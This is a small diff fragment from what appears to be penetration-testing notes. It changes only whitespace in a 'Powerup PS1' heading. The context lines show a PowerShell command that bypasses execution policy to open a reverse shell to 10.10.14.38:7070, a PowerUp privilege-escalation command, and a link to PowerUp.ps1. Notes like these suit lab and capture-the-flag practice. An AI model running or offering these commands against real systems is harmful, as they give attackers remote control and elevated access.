@@ -157,7 +157,7 @@ powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-All
 Powershell.exe -exec bypass -Command "& {Import-Module .\shell.ps1; Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.38 -Port 7070}" 
 
  
-# Powerup PS1
+# Powerup PS1 
 
 https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1 
 
